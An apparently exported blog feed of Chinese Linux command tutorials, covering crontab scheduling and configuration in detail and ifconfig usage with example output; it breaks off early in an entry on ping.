    <content type="text"><![CDATA[Linux 命令- crontab&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;循环运行的例行性计划任务，linux系统则是由 cron (crond) 这个系统服务来控制的。Linux 系统上面原本就有非常多的计划性工作，因此这个系统服务是默认启动的。另外, 由于使用者自己也可以设置计划任务，所以， Linux 系统也提供了使用者控制计划任务的命令 :crontab 命令。 一、crond简介&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;crond是linux下用来周期性的执行某种任务或等待处理某些事件的一个守护进程，与windows下的计划任务类似，当安装完成操作系统后，默认会安装此服务工具，并且会自动启动crond进程，crond进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux下的任务调度分为两类，系统任务调度和用户任务调度。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;系统任务调度：系统周期性所要执行的工作，比如写缓存数据到硬盘、日志清理等。在/etc目录下有一个crontab文件，这个就是系统任务调度的配置文件。 123456789101112/etc/crontab文件包括下面几行：[root@localhost ~]# cat /etc/crontab SHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=""HOME=/# run-parts51 * * * * root run-parts /etc/cron.hourly24 7 * * * root run-parts /etc/cron.daily22 4 * * 0 root run-parts /etc/cron.weekly42 4 1 * * root run-parts /etc/cron.monthly[root@localhost ~]#` &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;前四行是用来配置crond任务运行的环境变量，第一行SHELL变量指定了系统要使用哪个shell，这里是bash，第二行PATH变量指定了系统执行命令的路径，第三行MAILTO变量指定了crond的任务执行信息将通过电子邮件发送给root用户，如果MAILTO变量的值为空，则表示不发送任务执行信息给用户，第四行的HOME变量指定了在执行命令或者脚本时使用的主目录。第六至九行表示的含义将在下个小节详细讲述。这里不在多说。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户任务调度：用户定期要执行的工作，比如用户数据备份、定时邮件提醒等。用户可以使用 crontab 工具来定制自己的计划任务。所有用户定义的crontab 文件都被保存在 /var/spool/cron目录中。其文件名与用户名一致。 使用者权限文件：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件：/etc/cron.deny &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：该文件中所列用户不允许使用crontab命令 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件：/etc/cron.allow &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：该文件中所列用户允许使用crontab命令 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件：/var/spool/cron/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：所有用户crontab文件存放的目录,以用户名命名 crontab文件的含义：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户所建立的crontab文件中，每一行都代表一项任务，每行的每个字段代表一项设置，它的格式共分为六个字段，前五段是时间设定段，第六段是要执行的命令段，格式如下： 1minute hour day month week command &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中： minute： 表示分钟，可以是从0到59之间的任何整数。 hour：表示小时，可以是从0到23之间的任何整数。 day：表示日期，可以是从1到31之间的任何整数。 month：表示月份，可以是从1到12之间的任何整数。 week：表示星期几，可以是从0到7之间的任何整数，这里的0或7代表星期日。 command：要执行的命令，可以是系统命令，也可以是自己编写的脚本文件。 在以上各个字段中，还可以使用以下特殊字符： 星号（*）：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。 逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9” 中杠（-）：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6” 正斜线（/）：可以用正斜线指定时间的间隔频率，例如“0-23/2”表示每两小时执行一次。同时正斜线可以和星号一起使用，例如*/10，如果用在minute字段，表示每十分钟执行一次。 二、crond服务&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装crontab： 1yum install crontabs &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;服务操作说明： 123456789101112/sbin/service crond start //启动服务/sbin/service crond stop //关闭服务/sbin/service crond restart //重启服务/sbin/service crond reload //重新载入配置查看crontab服务状态：service crond status手动启动crontab服务：service crond start查看crontab服务是否已设置为开机启动，执行命令：ntsysv加入开机自动启动：chkconfig –level 35 crond on 三、crontab命令详解1．命令格式12crontab [-u user] filecrontab [-u user] [ -e | -l | -r ] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过crontab 命令，我们可以在固定的间隔时间执行指定的系统指令或 shell script脚本。时间间隔的单位可以是分钟、小时、日、月、周及以上的任意组合。这个命令非常设合周期性的日志分析或数据备份等工作。 3．命令参数 -u user：用来设定某个用户的crontab服务，例如，“-u ixdba”表示设定ixdba用户的crontab服务，此参数一般有root用户来运行。 file：file是命令文件的名字,表示将file做为crontab的任务列表文件并载入crontab。如果在命令行中没有指定这个文件，crontab命令将接受标准输入（键盘）上键入的命令，并将它们载入crontab。 -e：编辑某个用户的crontab文件内容。如果不指定用户，则表示编辑当前用户的crontab文件。 -l：显示某个用户的crontab文件内容，如果不指定用户，则表示显示当前用户的crontab文件内容。 -r：从/var/spool/cron目录中删除某个用户的crontab文件，如果不指定用户，则默认删除当前用户的crontab文件。 -i：在删除用户的crontab文件时给确认提示。 4．常用方法1). 创建一个新的crontab文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在考虑向cron进程提交一个crontab文件之前，首先要做的一件事情就是设置环境变量EDITOR。cron进程根据它来确定使用哪个编辑器编辑crontab文件。9 9 %的UNIX和LINUX用户都使用vi，如果你也是这样，那么你就编辑$ HOME目录下的. profile文件，在其中加入这样一行： 1EDITOR=vi; export EDITOR &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后保存并退出。不妨创建一个名为 cron的文件，其中是用户名，例如， davecron。在该文件中加入如下的内容。 123# (put your own initials here)echo the date to the console every# 15minutes between 6pm and 6am0,15,30,45 18-06 * * * /bin/echo 'date' &gt; /dev/console &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存并退出。确信前面5个域用空格分隔。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在上面的例子中，系统将每隔1 5分钟向控制台输出一次当前时间。如果系统崩溃或挂起，从最后所显示的时间就可以一眼看出系统是什么时间停止工作的。在有些系统中，用tty1来表示控制台，可以根据实际情况对上面的例子进行相应的修改。为了提交你刚刚创建的crontab文件，可以把这个新创建的文件作为cron命令的参数： 1$ crontab davecron &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在该文件已经提交给cron进程，它将每隔1 5分钟运行一次。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同时，新创建文件的一个副本已经被放在/var/spool/cron目录中，文件名就是用户名(即dave)。 2). 列出crontab文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了列出crontab文件，可以用： 12$ crontab -l0,15,30,45,18-06 * * * /bin/echo `date` &gt; dev/tty1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将会看到和上面类似的内容。可以使用这种方法在$ H O M E目录中对crontab文件做一备份： 1$ crontab -l &gt; $HOME/mycron &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样，一旦不小心误删了crontab文件，可以用上一节所讲述的方法迅速恢复。 3). 编辑crontab文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果希望添加、删除或编辑crontab文件中的条目，而E D I TO R环境变量又设置为v i，那么就可以用v i来编辑crontab文件，相应的命令为： 1$ crontab -e &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以像使用vi编辑其他任何文件那样修改crontab文件并退出。如果修改了某些条目或添加了新的条目，那么在保存该文件时， c r o n会对其进行必要的完整性检查。如果其中的某个域出现了超出允许范围的值，它会提示你。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们在编辑crontab文件时，没准会加入新的条目。例如，加入下面的一条： 12# DT:delete core files,at 3.30am on 1,7,14,21,26,26 days of each month30 3 1,7,14,21,26 * * /bin/find -name "core' -exec rm &#123;&#125; \; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在保存并退出。最好在crontab文件的每一个条目之上加入一条注释，这样就可以知道它的功能、运行时间，更为重要的是，知道这是哪位用户的作业。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在让我们使用前面讲过的crontab -l命令列出它的全部信息： 123456$ crontab -l # (crondave installed on Tue May 4 13:07:43 1999)# DT:ech the date to the console every 30 minites0,15,30,45 18-06 * * * /bin/echo `date` &gt; /dev/tty1# DT:delete core files,at 3.30am on 1,7,14,21,26,26 days of each month30 3 1,7,14,21,26 * * /bin/find -name "core' -exec rm &#123;&#125; \; 4). 删除crontab文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要删除crontab文件，可以用： 1$ crontab -r 5). 恢复丢失的crontab文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果不小心误删了crontab文件，假设你在自己的$ H O M E目录下还有一个备份，那么可以将其拷贝到/var/spool/cron/，其中是用户名。如果由于权限问题无法完成拷贝，可以用： 1$ crontab &lt;filename&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中，是你在$ H O M E目录中副本的文件名。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;建议在自己的$ H O M E目录中保存一个该文件的副本。我就有过类似的经历，有数次误删了crontab文件（因为r键紧挨在e键的右边）。这就是为什么有些系统文档建议不要直接编辑crontab文件，而是编辑该文件的一个副本，然后重新提交新的文件。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有些crontab的变体有些怪异，所以在使用crontab命令时要格外小心。如果遗漏了任何选项，crontab可能会打开一个空文件，或者看起来像是个空文件。这时敲delete键退出，不要按，否则你将丢失crontab文件。 5．使用实例实例1：每1分钟执行一次command&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1* * * * * command 实例2：每小时的第3和第15分钟执行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 13,15 * * * * command 实例3：在上午8点到11点的第3和第15分钟执行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 13,15 8-11 * * * command 实例4：每隔两天的上午8点到11点的第3和第15分钟执行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 123456789101112131415161718192021223,15 8-11 */2 * * command``` #### 实例5：每个星期一的上午8点到11点的第3和第15分钟执行&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;**命令**```bash3,15 8-11 * * 1 command``` #### 实例6：每晚的21:30重启smb &amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;**命令**```bash30 21 * * * /etc/init.d/smb restart``` #### 实例7：每月1、10、22日的4 : 45重启smb &amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;**命令**```bash45 4 1,10,22 * * /etc/init.d/smb restart 实例8：每周六、周日的1 : 10重启smb&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 110 1 * * 6,0 /etc/init.d/smb restart 实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 123456780,30 18-23 * * * /etc/init.d/smb restart``` #### 实例10：每星期六的晚上11 : 00 pm重启smb &amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;**命令**```bash0 23 * * 6 /etc/init.d/smb restart 实例11：每一小时重启smb&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1* */1 * * * /etc/init.d/smb restart 实例12：晚上11点到早上7点之间，每隔一小时重启smb&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12345678* 23-7/1 * * * /etc/init.d/smb restart``` #### 实例13：每月的4号与每周一到周三的11点重启smb &amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;**命令**```bash0 11 4 * mon-wed /etc/init.d/smb restart 实例14：一月一号的4点重启smb&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 10 4 1 jan * /etc/init.d/smb restart 实例15：每小时执行/etc/cron.hourly目录内的脚本&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 101 * * * * root run-parts /etc/cron.hourly &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;run-parts这个参数了，如果去掉这个参数的话，后面就可以写要运行的某个脚本名，而不是目录名了 四、使用注意事项1. 注意环境变量问题&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时创建了一个crontab，但是这个任务却无法自动执行，而手动执行这个任务却没有问题，这种情况一般是由于在crontab文件中没有配置环境变量引起的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在crontab文件中定义多个调度任务时，需要特别注意的一个问题就是环境变量的设置，因为我们手动执行某个任务时，是在当前shell环境下进行的，程序当然能找到环境变量，而系统自动执行任务调度时，是不会加载任何环境变量的，因此，就需要在crontab文件中指定任务运行所需的所有环境变量，这样，系统执行任务调度时就没有问题了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不要假定cron知道所需要的特殊环境，它其实并不知道。所以你要保证在shelll脚本中提供所有必要的路径和环境变量，除了一些自动设置的全局变量。所以注意如下3点： 脚本中涉及文件路径时写全局路径； 脚本执行要用到java或其他环境变量时，通过source命令引入环境变量，如： 12345cat start_cbp.sh#!/bin/shsource /etc/profileexport RUN_CONF=/home/d139/conf/platform/cbp/cbp_jboss.conf/usr/local/jboss-4.0.5/bin/run.sh -c mev &amp; 当手动执行脚本OK，但是crontab死活不执行时。这时必须大胆怀疑是环境变量惹的祸，并可以尝试在crontab中直接引入环境变量解决问题。如： 10 * * * * . /etc/profile;/bin/sh /var/www/java/audit_no_count/bin/restart_audit.sh 2. 注意清理系统用户的邮件日志&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每条任务调度执行完毕，系统都会将任务输出信息通过电子邮件的形式发送给当前系统用户，这样日积月累，日志信息会非常大，可能会影响系统的正常运行，因此，将每条任务进行重定向处理非常重要。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如，可以在crontab文件中设置如下形式，忽略日志输出： 10 */3 * * * /usr/local/apache2/apachectl restart &gt;/dev/null 2&gt;&amp;1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“/dev/null 2&gt;&amp;1”表示先将标准输出重定向到/dev/null，然后将标准错误重定向到标准输出，由于标准输出已经重定向到了/dev/null，因此标准错误也会重定向到/dev/null，这样日志输出问题就解决了。 3. 系统级任务调度与用户级任务调度&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;系统级任务调度主要完成系统的一些维护操作，用户级任务调度主要完成用户自定义的一些任务，可以将用户级任务调度放到系统级任务调度来完成（不建议这么做），但是反过来却不行，root用户的任务调度操作可以通过“crontab –uroot –e”来设置，也可以将调度任务直接写入/etc/crontab文件，需要注意的是，如果要定义一个定时重启系统的任务，就必须将任务放到/etc/crontab文件，即使在root用户下创建一个定时重启系统的任务也是无效的。 4. 其他注意事项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;新创建的cron job，不会马上执行，至少要过2分钟才执行。如果重启cron则马上执行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当crontab突然失效时，可以尝试/etc/init.d/crond restart解决问题。或者查看日志看某个job有没有执行/报错tail -f /var/log/cron。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;千万别乱运行crontab -r。它从Crontab目录（/var/spool/cron）中删除用户的Crontab文件。删除了该用户的所有crontab都没了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在crontab中%是有特殊含义的，表示换行的意思。如果要用的话必须进行转义\%，如经常用的date ‘+%Y%m%d’在crontab里是不会执行的，应该换成date ‘+\%Y\%m\%d’。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- ifconfig]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F54.%20Linux%20%E5%91%BD%E4%BB%A4-%20ifconfig%2F</url>
    <content type="text"><![CDATA[Linux 命令- ifconfig&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;许多windows非常熟悉ipconfig命令行工具，它被用来获取网络接口配置信息并对此进行修改。Linux系统拥有一个类似的工具，也就是ifconfig(interfaces config)。通常需要以root身份登录或使用sudo以便在Linux机器上使用ifconfig工具。依赖于ifconfig命令中使用一些选项属性，ifconfig工具不仅可以被用来简单地获取网络接口配置信息，还可以修改这些配置。 1．命令格式1ifconfig [网络设备] [参数] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ifconfig 命令用来查看和配置网络设备。当网络环境发生改变时可通过此命令对网络进行相应的配置。 3．命令参数 up 启动指定网络设备/网卡。 down 关闭指定网络设备/网卡。该参数可以有效地阻止通过指定接口的IP信息流，如果想永久地关闭一个接口，我们还需要从核心路由表中将该接口的路由信息全部删除。 arp 设置指定网卡是否支持ARP协议。 -promisc 设置是否支持网卡的promiscuous模式，如果选择此参数，网卡将接收网络中发给它所有的数据包 -allmulti 设置是否支持多播模式，如果选择此参数，网卡将接收网络中所有的多播数据包 -a 显示全部接口信息 -s 显示摘要信息（类似于 netstat -i） add 给指定网卡配置IPv6地址 del 删除指定网卡的IPv6地址 &lt;硬件地址&gt; 配置网卡最大的传输单元 mtu&lt;字节数&gt; 设置网卡的最大传输单元 (bytes) netmask&lt;子网掩码&gt; 设置网卡的子网掩码。掩码可以是有前缀0x的32位十六进制数，也可以是用点分开的4个十进制数。如果不打算将网络分成子网，可以不管这一选项；如果要使用子网，那么请记住，网络中每一个系统必须有相同子网掩码。 tunel 建立隧道 dstaddr 设定一个远端地址，建立点对点通信 -broadcast&lt;地址&gt; 为指定网卡设置广播协议 -pointtopoint&lt;地址&gt; 为网卡设置点对点通讯协议 multicast 为网卡设置组播标志 address 为网卡设置IPv4地址 txqueuelen&lt;长度&gt; 为网卡设置传输列队的长度 4．使用实例实例1：显示网络设备信息（激活状态的）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ifconfig &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516[root@localhost ~]# ifconfigeth0 Link encap:Ethernet HWaddr 00:50:56:BF:26:20 inet addr:192.168.120.204 Bcast:192.168.120.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:8700857 errors:0 dropped:0 overruns:0 frame:0 TX packets:31533 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:596390239 (568.7 MiB) TX bytes:2886956 (2.7 MiB)lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:68 errors:0 dropped:0 overruns:0 frame:0 TX packets:68 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:2856 (2.7 KiB) TX bytes:2856 (2.7 KiB) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 eth0 表示第一块网卡， 其中 HWaddr 表示网卡的物理地址，可以看到目前这个网卡的物理地址(MAC地址）是 00:50:56:BF:26:20 inet addr 用来表示网卡的IP地址，此网卡的 IP地址是 192.168.120.204，广播地址， Bcast:192.168.120.255，掩码地址Mask:255.255.255.0 lo 是表示主机的回坏地址，这个一般是用来测试一个网络程序，但又不想让局域网或外网的用户能够查看，只能在此台主机上运行和查看所用的网络接口。比如把 HTTPD服务器的指定到回坏地址，在浏览器输入 127.0.0.1 就能看到你所架WEB网站了。但只是您能看得到，局域网的其它主机或用户无从知道。 第一行：连接类型：Ethernet（以太网）HWaddr（硬件mac地址） 第二行：网卡的IP地址、子网、掩码 第三行：UP（代表网卡开启状态）RUNNING（代表网卡的网线被接上）MULTICAST（支持组播）MTU:1500（最大传输单元）：1500字节 第四、五行：接收、发送数据包情况统计 第七行：接收、发送数据字节数统计信息。 实例2：启动关闭指定网卡&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12ifconfig eth0 upifconfig eth0 down &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ifconfig eth0 up 为启动网卡eth0 ；ifconfig eth0 down 为关闭网卡eth0。ssh登陆linux服务器操作要小心，关闭了就不能开启了，除非你有多网卡。 实例3：为网卡配置和删除IPv6地址&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12ifconfig eth0 add 33ffe:3240:800:1005::2/64ifconfig eth0 del 33ffe:3240:800:1005::2/64 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 ifconfig eth0 add 33ffe:3240:800:1005::2/64 为网卡eth0配置IPv6地址； ifconfig eth0 add 33ffe:3240:800:1005::2/64 为网卡eth0删除IPv6地址； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;练习的时候，ssh登陆linux服务器操作要小心，关闭了就不能开启了，除非有多网卡。 实例4：用ifconfig修改MAC地址&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ifconfig eth0 hw ether 00:AA:BB:CC:DD:EE &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728293031323334353637[root@localhost ~]# ifconfig eth0 down //关闭网卡[root@localhost ~]# ifconfig eth0 hw ether 00:AA:BB:CC:DD:EE //修改MAC地址[root@localhost ~]# ifconfig eth0 up //启动网卡[root@localhost ~]# ifconfigeth0 Link encap:Ethernet HWaddr 00:AA:BB:CC:DD:EE inet addr:192.168.120.204 Bcast:192.168.120.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:8700857 errors:0 dropped:0 overruns:0 frame:0 TX packets:31533 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:596390239 (568.7 MiB) TX bytes:2886956 (2.7 MiB)lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:68 errors:0 dropped:0 overruns:0 frame:0 TX packets:68 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:2856 (2.7 KiB) TX bytes:2856 (2.7 KiB)[root@localhost ~]# ifconfig eth0 hw ether 00:50:56:BF:26:20 //关闭网卡并修改MAC地址 [root@localhost ~]# ifconfig eth0 up //启动网卡[root@localhost ~]# ifconfigeth0 Link encap:Ethernet HWaddr 00:50:56:BF:26:20 inet addr:192.168.120.204 Bcast:192.168.120.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:8700857 errors:0 dropped:0 overruns:0 frame:0 TX packets:31533 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:596390239 (568.7 MiB) TX bytes:2886956 (2.7 MiB)lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:68 errors:0 dropped:0 overruns:0 frame:0 TX packets:68 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:2856 (2.7 KiB) TX bytes:2856 (2.7 KiB) 实例5：配置IP地址&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123[root@localhost ~]# ifconfig eth0 192.168.120.56 [root@localhost ~]# ifconfig eth0 192.168.120.56 netmask 255.255.255.0 [root@localhost ~]# ifconfig eth0 192.168.120.56 netmask 255.255.255.0 broadcast 192.168.120.255 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ifconfig eth0 192.168.120.56 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;给eth0网卡配置IP地：192.168.120.56 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ifconfig eth0 192.168.120.56 netmask 255.255.255.0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;给eth0网卡配置IP地址：192.168.120.56 ，并加上子掩码：255.255.255.0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ifconfig eth0 192.168.120.56 netmask 255.255.255.0 broadcast 192.168.120.255 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/给eth0网卡配置IP地址：192.168.120.56，加上子掩码：255.255.255.0，加上个广播地址： 192.168.120.255 实例6：启用和关闭ARP协议&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12ifconfig eth0 arpifconfig eth0 -arp &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12[root@localhost ~]# ifconfig eth0 arp [root@localhost ~]# ifconfig eth0 -arp &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ifconfig eth0 arp 开启网卡eth0 的arp协议； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ifconfig eth0 -arp 关闭网卡eth0 的arp协议； 实例7：设置最大传输单元&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ifconfig eth0 mtu 1500 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728293031323334353637[root@localhost ~]# ifconfig eth0 mtu 1480[root@localhost ~]# ifconfigeth0 Link encap:Ethernet HWaddr 00:50:56:BF:26:1F inet addr:192.168.120.203 Bcast:192.168.120.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1480 Metric:1 RX packets:8712395 errors:0 dropped:0 overruns:0 frame:0 TX packets:36631 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:597062089 (569.4 MiB) TX bytes:2643973 (2.5 MiB)lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:9973 errors:0 dropped:0 overruns:0 frame:0 TX packets:9973 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:518096 (505.9 KiB) TX bytes:518096 (505.9 KiB)[root@localhost ~]# ifconfig eth0 mtu 1500[root@localhost ~]# ifconfigeth0 Link encap:Ethernet HWaddr 00:50:56:BF:26:1F inet addr:192.168.120.203 Bcast:192.168.120.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:8712548 errors:0 dropped:0 overruns:0 frame:0 TX packets:36685 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:597072333 (569.4 MiB) TX bytes:2650581 (2.5 MiB)lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:9973 errors:0 dropped:0 overruns:0 frame:0 TX packets:9973 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:518096 (505.9 KiB) TX bytes:518096 (505.9 KiB)[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置能通过的最大数据包大小为 1500 bytes &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备注：用ifconfig命令配置的网卡信息，在网卡重启后机器重启后，配置就不存在。要想将上述的配置信息永远的存的电脑里，那就要修改网卡的配置文件了。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- ping]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F56.%20Linux%20%E5%91%BD%E4%BB%A4-%20ping%2F</url>
    <content type="text"><![CDATA[Linux 命令- ping&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux系统的ping命令是常用的网络命令，它通常用来测试与目标主机的连通性，我们经常会说“ping一下某机器，看是不是开着”、不能打开网页时会说“你先ping网关地址192.168.1.1试试”。它通过发送ICMP ECHO_REQUEST数据包到网络主机（send ICMP ECHO_REQUEST to network hosts），并显示响应情况，这样我们就可以根据它输出的信息来确定目标主机是否可访问（但这不是绝对的）。有些服务器为了防止通过ping探测到，通过防火墙设置了禁止ping或者在内核参数中禁止ping，这样就不能通过ping确定该主机是否还处于开启状态。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux下的ping和windows下的ping稍有区别,linux下ping不会自动终止,需要按ctrl+c终止或者用参数-c指定要求完成的回应次数。 1.命令格式1ping [参数] [主机名或IP地址] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ping命令用于：确定网络和各外部主机的状态；跟踪和隔离硬件和软件问题；测试、评估和管理网络。如果主机正在运行并连在网上，它就对回送信号进行响应。每个回送信号请求包含一个网际协议（IP）和 ICMP 头，后面紧跟一个 tim 结构，以及来填写这个信息包的足够的字节。缺省情况是连续发送回送信号请求直到接收到中断信号（Ctrl-C)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ping 命令每秒发送一个数据报并且为每个接收到的响应打印一行输出。ping 命令计算信号往返时间和(信息)包丢失情况的统计信息，并且在完成之后显示一个简要总结。ping 命令在程序超时或当接收到 SIGINT 信号时结束。Host 参数或者是一个有效的主机名或者是因特网地址。 3.命令参数 -d 